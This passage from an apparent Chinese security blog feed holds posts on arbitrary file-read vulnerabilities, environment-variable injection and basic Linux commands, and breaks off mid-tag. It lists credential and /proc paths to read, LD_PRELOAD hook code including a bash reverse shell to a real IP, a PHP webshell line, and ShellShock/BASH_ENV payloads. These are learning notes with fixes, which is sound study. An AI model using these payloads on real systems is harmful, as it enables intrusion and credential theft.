        <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>一些网站由于业务需要，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，攻击者就能够通过回溯符<code>../</code>或<code>绝对路径</code>跳转到任意目录查看或下载任意的文件；这可能是代码源文件，敏感配置文件等等，在特定的场景下，还可能造成SSRF漏洞。</p><h1 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h1><p><img src="/../images/qcLDlsYeCB1V6EK.png" alt="image-20220112103936559"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>读取</p><ul><li>网站源码</li><li>配置文件</li></ul><table><thead><tr><th align="center">中间件</th><th align="center">配置 文件目录</th><th align="center">主配置文件</th><th align="center">网站目录</th><th align="center">日志目录</th></tr></thead><tbody><tr><td align="center">nginx</td><td align="center">&#x2F;etc&#x2F;nginx&#x2F;</td><td align="center">nginx.conf</td><td align="center">&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;</td><td align="center">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;</td></tr><tr><td align="center">apache</td><td align="center">&#x2F;etc&#x2F;apache2&#x2F;</td><td align="center">apache2.conf</td><td align="center">&#x2F;var&#x2F;www&#x2F;html&#x2F;</td><td align="center">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;</td></tr><tr><td align="center">tomcat</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf</td><td align="center">如下图</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;log</td></tr></tbody></table><p><img src="/../images/image-20230301144917539-1686983536199.png" alt="image-20230301144917539"></p><ul><li><p>java站点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/web.xml</span><br><span class="line">/WEB-INF/classes/applicationContext.xml</span><br><span class="line">/WEB-INF/classes/xxx/xxx/xxx.class</span><br><span class="line">core.jar</span><br></pre></td></tr></table></figure><blockquote><p>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell</p></blockquote></li><li><p>tomcat</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/tomcat/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure></li><li><p>nginx</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www/nginx/conf/nginx.conf</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/usr/local/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure></li><li><p>apache</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br></pre></td></tr></table></figure></li><li><p>redis<br><code>/etc/redis.conf</code></p></li><li><p>ssh<br><code>/etc/ssh/sshd_config</code></p></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="x2F-etc-系统配置文件目录"><a href="#x2F-etc-系统配置文件目录" class="headerlink" title="&#x2F;etc 系统配置文件目录"></a><strong>&#x2F;etc 系统配置文件目录</strong></h4><ul><li><p>&#x2F;etc&#x2F;passwd</p><p>记录用户信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">tcpdump:x:72:72::/:/sbin/nologin</span><br><span class="line">....</span><br><span class="line">允许登入的shell就是/bin/bash禁止shell登入就是/sbin/nologin</span><br></pre></td></tr></table></figure><ul><li><p>格式解析</p><p>以:作为分隔符<br>登录名:加密的口令:UID:GID:用户信息:用户目录:用户登陆后使用的shell</p></li><li><p>为什么有些登录名是服务进程名？</p><blockquote><p>Linux系统会为各种各样的功能创建不同的用户账户，而这些账户并不是真的用户。</p><p>这些账户叫作系统账户，是系统上运行的各种服务进程访问资源用的特殊账户。</p><p>比如上述的ftp，tcpdump。</p></blockquote></li><li><p>为什么要这样做？</p><blockquote><p>在安全成为一个大问题之前，这些服务经常会用root账户登录。遗憾的是，如果有非授权的用户攻陷了这些服务中的一个，他立刻就能作为root用户进入系统。为了防止发生这种情况，现在运行在Linux服务器后台的几乎所有的服务都是用自己的账户登录。这样的话，即使有人攻入了某个服务，也无法访问整个系统。</p></blockquote></li><li><p>为什么密码都是X</p><blockquote><p>鉴于很多程序都需要访问etc&#x2F;passwd文件获取用户信息，这就成了一个安全隐患。</p><p>绝大多数Linux系统都将用户密码保存在另一个单独的文件中（叫作shadow文件，位置</p><p>在&#x2F;etc&#x2F;shadow）。只有特定的程序（比如登录程序）才能访问这个文件</p></blockquote></li></ul></li><li><p>&#x2F;etc&#x2F;shadow</p><blockquote><p>&#x2F;etc&#x2F;shadow文件对Linux系统密码管理提供了更多的控制。只有root用户才能访问&#x2F;etc&#x2F;shadow</p><p>文件，这让它比起&#x2F;etc&#x2F;passwd安全许多。</p></blockquote></li><li><p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>mac地址</p></li></ul><h4 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h4><p>文件内容解释<a href="https://blog.csdn.net/weichanghu_/article/details/80073959">https://blog.csdn.net/weichanghu_/article/details/80073959</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/hosts：记录本机的或其他主机的ip及其对应主机名</span><br><span class="line">/proc/net/arp：记录主机ip和mac？（arp协议）</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/dev</span><br><span class="line">/proc/net/fib_trie</span><br></pre></td></tr></table></figure><h4 id="命令历史操作"><a href="#命令历史操作" class="headerlink" title="命令历史操作"></a>命令历史操作</h4><p><a href="https://blog.csdn.net/u011479200/article/details/86501366">Linux| 用户目录下三个bash文件的作用(.bash_history,.bash_logout,.bash_profile,.bashrc)_YvesHe的博客-CSDN博客_bash_history</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/用户名/.bash_history： 保存了当前用户使用过的历史命令</span><br></pre></td></tr></table></figure><blockquote><p>命令历史记录被保存在隐藏文件.bash_history中，它位于用户的主目录中。</p><p>这里要注意的是，bash命令的历史记录是先存放在内存中，当shell退出时才被写入到历史文件中。</p></blockquote><p>root用户可以通过<code>history</code>命令查看</p><p><img src="/../images/image-20220923180951946-1686983536198.png" alt="image-20220923180951946"></p><h4 id="x2F-proc目录"><a href="#x2F-proc目录" class="headerlink" title="&#x2F;proc目录"></a>&#x2F;proc目录</h4><blockquote><p>&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/proc/self/cmdline</span><br><span class="line">/proc/self/cwd</span><br><span class="line">/proc/self/exe</span><br><span class="line">/proc/self/environ</span><br><span class="line">/proc/self/mounts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">爆破</span></span><br><span class="line">/proc/pid/fd</span><br><span class="line">/proc/?/fd  # 使用通配符匹配</span><br></pre></td></tr></table></figure><h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><blockquote><ol><li><strong>在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></li><li><strong><code>/proc/self</code>在使用时，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取&#x2F;proc&#x2F;self&#x2F;cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如文件包含漏洞，或者SSTI使用file模块读取文件）的方式读取&#x2F;proc&#x2F;self&#x2F;cmdline。</strong></li></ol></blockquote><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ol><li>在配置文件中限制访问的文件目录</li><li>检查用户输入，过滤或转义含有<code>../</code>、<code>..\</code>、<code>%00</code>，<code>..</code>，<code>./</code>，<code>#</code>等跳转目录或字符终止符、截断字符的输入</li><li>严格过滤用户输入字符的合法性，比如文件类型、文件地址、文件内容等</li><li>白名单限定访问文件的目录、路径、名称</li><li>白名单限定访问文件的后缀如jpg、gif、png、rar、zip、pdf、doc、xls、ppt等</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>环境变量注入</title>
      <link href="/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><blockquote><p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p></blockquote><p>具体的操作步骤如下：</p><ol><li>定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等。</li><li>将包含替换函数的源码编译为动态链接库。</li><li>通过命令 <code>export LD_PRELOAD=&quot;库文件路径&quot;</code>，设置要优先替换动态链接库即可。</li><li>替换结束，要还原函数调用关系，用命令<code>unset LD_PRELOAD</code> 解除</li></ol><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="劫持ls命令"><a href="#劫持ls命令" class="headerlink" title="劫持ls命令"></a>劫持ls命令</h2><p>查找ls命令执行时调用的系统函数，例如调用了<code>strncmp</code></p><p>payload</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *__s1, <span class="type">const</span> <span class="type">char</span> *__s2, <span class="type">size_t</span> __n)</span> &#123;    </span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里函数的定义可以根据报错信息进行确定</p><img src="E:\typora img\QQ截图20221107134218.jpg" alt="QQ截图20221107134218" style="zoom:67%;" /><p>从源码中找到的</p><img src="E:\typora img\QQ截图20221107134226.jpg" alt="QQ截图20221107134226" style="zoom: 67%;" /><p>编译形成.so文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure><p>环境变量设置优先级</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=$PWD/hook_strncmp.so</span><br></pre></td></tr></table></figure><p>执行命令结果</p><p><img src="/../images/image-20221107135601599-1686813288526.png" alt="image-20221107135601599"></p><h2 id="更为简单的劫持"><a href="#更为简单的劫持" class="headerlink" title="更为简单的劫持"></a>更为简单的劫持</h2><p>GCC 有个 C 语言扩展修饰符 <strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在动态链接库中，那么<strong>一旦动态链接库被系统加载，将立即执行 _attribute((constructor)) 修饰的函数</strong>。这样，我们就不用局限于仅劫持某一函数，而应考虑劫持动态链接库了，也可以说是劫持了一个新进程。</p><ul><li><p>hook.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">    <span class="comment">//system(&quot;echo \&quot;&lt;?php eval(\\$_POST[cmd]);?&gt;\&quot; &gt; /var/www/html/shell.php&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译形成.so文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hook.c -o hook.so</span><br></pre></td></tr></table></figure></li></ul><h2 id="PHP中"><a href="#PHP中" class="headerlink" title="PHP中"></a>PHP中</h2><ul><li>RCE</li><li>绕过disable_function</li></ul><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul><li>能够上传文件，只要是.so文件，任意后缀名都可以解析</li><li>能够设置环境变量<code>LD_PRELOAD</code></li><li>有可以启动新进程的 PHP 函数（这样才能够劫持）</li></ul><h3 id="如何找到可以启动新进程的-PHP-函数"><a href="#如何找到可以启动新进程的-PHP-函数" class="headerlink" title="如何找到可以启动新进程的 PHP 函数"></a>如何找到可以启动新进程的 PHP 函数</h3><p>查看PHP函数调用时的shell操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strace -f php test.php <span class="number">2</span>&gt;&amp;<span class="number">1</span> | grep -A2 -B2 execve</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@localhost&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span>s</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221108113210633-1686813288527.png" alt="image-20221108113210633"></p><p>可以看到执行mail函数时实际是启动了一个新的进程来调用系统命令<code>sendmail</code></p><p>其他可以启动新进程的php函数</p><ul><li><code>error_log(&quot;&quot;, 1, &quot;&quot;, &quot;&quot;);</code></li><li><code>$img = new Imagick(&#39;/tmp/a5edb30f575fb2f877a19b2f62a2e720/whoami.wmv&#39;);</code></li><li><code>system</code></li><li><code>imap_mail()</code></li><li><code>mb_send_mail()</code></li></ul><h3 id="文件上传绕过disable-function"><a href="#文件上传绕过disable-function" class="headerlink" title="文件上传绕过disable_function"></a>文件上传绕过<code>disable_function</code></h3><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><h3 id="无上传文件操作–ShellShock（CVE-2014-6271）"><a href="#无上传文件操作–ShellShock（CVE-2014-6271）" class="headerlink" title="无上传文件操作–ShellShock（CVE-2014-6271）"></a>无上传文件操作–ShellShock（CVE-2014-6271）</h3><p>以下测试环境</p><p><img src="/../images/image-20221126164918984-1686813288527.png" alt="image-20221126164918984"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$key&#125;</span>=<span class="subst">&#123;$val&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//... 一些其他代码</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>); <span class="comment"># 相当于sh -c echo &quot;command&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>只适用于redhat系列–centos</p><blockquote><p>redhat系列sh指向bash</p><p><img src="/../images/image-20221126161815577-1686813288527.png" alt="image-20221126161815577"></p></blockquote><blockquote><p>debian系列指向dash</p><p><img src="/../images/image-20221126163241501-1686813288527.png" alt="image-20221126163241501"></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如TEST=&#x27;() &#123; :; &#125;&#x27;; id;</span><br><span class="line"></span><br><span class="line">Bash 4.4以前：env $&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27; bash -c &quot;echo hello&quot;</span><br><span class="line"></span><br><span class="line">Bash 4.4及以上：env $&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27; bash -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p>本地测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># system(&#x27;echo hello&#x27;); # 相当于sh -c echo &quot;command&quot;</span></span><br><span class="line">?envs[<span class="title function_ invoke__">BASH_FUNC_echo</span>()]=() &#123; ls; &#125;</span><br></pre></td></tr></table></figure><img src="E:\typora img\image-20221126170554976.png" alt="image-20221126170554976" style="zoom:50%;" /><h4 id="其他情况下的环境变量注入payload"><a href="#其他情况下的环境变量注入payload" class="headerlink" title="其他情况下的环境变量注入payload"></a>其他情况下的环境变量注入payload</h4><h5 id="redhat"><a href="#redhat" class="headerlink" title="redhat"></a>redhat</h5><ul><li><p><code>PROMPT_COMMAND</code>：可以在<code>bash</code>交互式环境下执行任意命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PROMPT_COMMAND=&#x27;id&#x27; bash</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162222851-1686813288528.png" alt="image-20221126162222851"></p></li></ul><h5 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h5><ul><li><code>ENV</code>：可以在<code>sh -i -c</code>的时候注入任意命令</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ENV=&#x27;$(id 1&gt;&amp;2)&#x27; sh -i -c &quot;echo hello&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162443791-1686813288528.png" alt="image-20221126162443791"></p><p><img src="/../images/image-20221126162453087-1686813288528.png" alt="image-20221126162453087"></p><ul><li><p><code>BASH_ENV</code>：可以在<code>bash -c</code>的时候注入任意命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BASH_ENV=&#x27;$(id 1&gt;&amp;2)&#x27; bash -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162613165-1686813288528.png" alt="image-20221126162613165"></p></li></ul><p><img src="/../images/image-20221126162622468-1686813288528.png" alt="image-20221126162622468"></p><ul><li><p><code>PS1</code>：可以在<code>dash</code>或<code>bash</code>交互式环境下执行任意命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS1=&#x27;$(whoami)&#x27; dash/bash</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126163037850-1686813288528.png" alt="image-20221126163037850"></p></li></ul><p><img src="/../images/image-20221126163059160-1686813288528.png" alt="image-20221126163059160"></p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;command&#x27;</span>) ----&gt;  <span class="title function_ invoke__">php_exec_ex</span>() ----&gt;   <span class="title function_ invoke__">php_exec</span>()  ---&gt;   linux popen函数  ---&gt;</span><br><span class="line">Linux glibc库    ----&gt;   sh -c <span class="keyword">echo</span> <span class="string">&quot;command&quot;</span>  </span><br></pre></td></tr></table></figure><blockquote><p>glibc是gnu发布的libc库，也即c运行库。glibc是linux 系统中最底层的api（应用程序开发接口），几乎其它任何的运行库都会倚赖于glibc。</p></blockquote><img src="E:\typora img\image-20221107153339706.png" alt="image-20221107153339706" style="zoom:67%;" /><img src="E:\typora img\image-20221107153422836.png" alt="image-20221107153422836" style="zoom:67%;" /><img src="E:\typora img\image-20221107153502513.png" alt="image-20221107153502513" style="zoom:67%;" /><img src="E:\typora img\image-20221107153708100.png" alt="image-20221107153708100" style="zoom:67%;" /><h5 id="debian系列"><a href="#debian系列" class="headerlink" title="debian系列"></a>debian系列</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c echo &quot;command&quot;  --&gt; dash -c echo &quot;command&quot;   #  在debian系列sh指向dash</span><br></pre></td></tr></table></figure><p>漏洞产生原因</p><p>在dash源码中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> linux</span></span><br><span class="line">getuid( ) == geteuid( ) &amp;&amp; getgid( ) == getegid( ) S &amp;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">iflag ）&#123;  <span class="comment">// iflag为-i参数，所以只有传入-i参数才能进入下面的if语句</span></span><br><span class="line"><span class="keyword">if</span> ((shinit = lookupvar(<span class="string">&quot;ENV&quot;</span>)) != <span class="literal">NULL</span> &amp;&amp; *shinit != <span class="string">&#x27;\0&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">    read_profile(shinit);</span><br><span class="line">&#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read_profile</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">STATIC <span class="type">void</span></span><br><span class="line"><span class="title function_">read_profile</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// expandstr可以解析shell命令，解析的name参数就是环境变量ENV</span></span><br><span class="line">    name = expandstr(name);</span><br><span class="line">    <span class="keyword">if</span> (setinputfile(name, INPUT_PUSH_FILE | INPUT_NOFILE_OK) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    cmdloop(<span class="number">0</span>);</span><br><span class="line">    popfile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ENV=&#x27;$(id 1&gt;&amp;2)&#x27; dash -i -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107152419461-1686813288528.png" alt="image-20221107152419461"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.anquanke.com/post/id/254388#h3-6">https://www.anquanke.com/post/id/254388#h3-6</a></p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令</title>
      <link href="/2023/05/31/Linux%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/05/31/Linux%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>Linux一切皆文件</p><p>没有信息就是好消息，说明命令成功了。</p><h2 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><h2 id="后台运行程序"><a href="#后台运行程序" class="headerlink" title="后台运行程序"></a>后台运行程序</h2><ul><li>后台运行</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd &amp;</span><br><span class="line">nohup cmd</span><br></pre></td></tr></table></figure><ul><li>查看后台程序</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jobs</span><br></pre></td></tr></table></figure><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><ul><li><p><code>vi /vim filename</code>：文本编辑器</p></li><li><p><code>touch filename</code>：创建空文件</p></li><li><p>重定向符创建</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;string&quot; &gt; filename</span><br><span class="line">cat &gt; filename：输入文件内容，ctrl+d保存并退出</span><br></pre></td></tr></table></figure></li></ul><h3 id="复制文件-x2F-目录"><a href="#复制文件-x2F-目录" class="headerlink" title="复制文件&#x2F;目录"></a>复制文件&#x2F;目录</h3><ul><li><p><code>cp file_path xx</code></p><p>当xx为文件时，即创建file的副本xx</p><p>当xx为目录时，即将file复制到xx目录下</p><p>可选参数：-R  复制文件夹</p></li></ul><h3 id="文件链接"><a href="#文件链接" class="headerlink" title="文件链接"></a>文件链接</h3><p><a href="https://www.runoob.com/note/29134">https://www.runoob.com/note/29134</a></p><ul><li><p>软链接&#x2F;符号链接</p><p><code>ln -s 源文件名 快捷方式名</code>（软连接，只是创建了一个快捷方式）</p></li><li><p>硬链接</p><p><code>ln  源文件名 文件名</code>（硬链接，两个文件是同步的，就是对任意一个操作，都会影响到两个）  </p></li><li><p>二者区别</p><p>删除了源文件，软连接就失效了，而硬链接相当于副本，不受影响。</p></li></ul><h3 id="重命名文件-x2F-目录"><a href="#重命名文件-x2F-目录" class="headerlink" title="重命名文件&#x2F;目录"></a>重命名文件&#x2F;目录</h3><blockquote><p>在Linux中，重命名文件称为移动（moving）</p></blockquote><ul><li><code>mv name1  name2</code>：更改文件名&#x2F;目录名</li><li><code>mv name dir_path</code>：移动文件&#x2F;目录</li><li><code>mv file_path   dir_path+file_name2</code>：移动文件并重命名</li></ul><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><blockquote><p>在Linux中，删除（deleting）叫作移除（removing）。</p></blockquote><ul><li><code>rm  filename</code><ul><li>-i：删除前询问</li><li>-f：强制删除</li></ul></li></ul><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><table><thead><tr><th align="center">命令</th><th align="center">作用</th><th align="center">可选参数</th></tr></thead><tbody><tr><td align="center">cat&#x2F;tac</td><td align="center">从头到尾显示文件内容（tac相反）</td><td align="center">-n：显示行号</td></tr><tr><td align="center">head&#x2F;tail</td><td align="center">读取前&#x2F;后lines行</td><td align="center">–lines&#x3D;？</td></tr><tr><td align="center">nl</td><td align="center">显示行号和内容</td><td align="center"></td></tr><tr><td align="center">sort</td><td align="center">排序文件内容并显示</td><td align="center"></td></tr><tr><td align="center">more</td><td align="center">分页显示文件内容</td><td align="center"></td></tr><tr><td align="center">uniq</td><td align="center">去重后，显示文件内容</td><td align="center"></td></tr><tr><td align="center">less</td><td align="center">一次显示一屏的文件文本</td><td align="center"></td></tr><tr><td align="center">paste</td><td align="center">可以将两个文本按列拼接到一起显示</td><td align="center"></td></tr><tr><td align="center">strings</td><td align="center">读取二进制文件（cat不能读取二进制）</td><td align="center"></td></tr></tbody></table><h3 id="搜索文件内容"><a href="#搜索文件内容" class="headerlink" title="搜索文件内容"></a>搜索文件内容</h3><p><code>grep string filename</code> ：在file中查找匹配string的内容</p><p>参数：</p><table><thead><tr><th align="center"></th><th align="center">功能</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">-v</td><td align="center">反向搜索</td><td align="center">grep -v t file1</td></tr><tr><td align="center">-n</td><td align="center">显示行号</td><td align="center">grep -n t file1</td></tr><tr><td align="center">-e</td><td align="center">多个匹配模式</td><td align="center">grep -e t -e f file1：匹配t和f字符</td></tr><tr><td align="center">正则</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="查看文件类型-x2F-状态"><a href="#查看文件类型-x2F-状态" class="headerlink" title="查看文件类型&#x2F;状态"></a>查看文件类型&#x2F;状态</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file filename</span><br><span class="line">stat filename</span><br></pre></td></tr></table></figure><h3 id="解压缩文件"><a href="#解压缩文件" class="headerlink" title="解压缩文件"></a>解压缩文件</h3><p><a 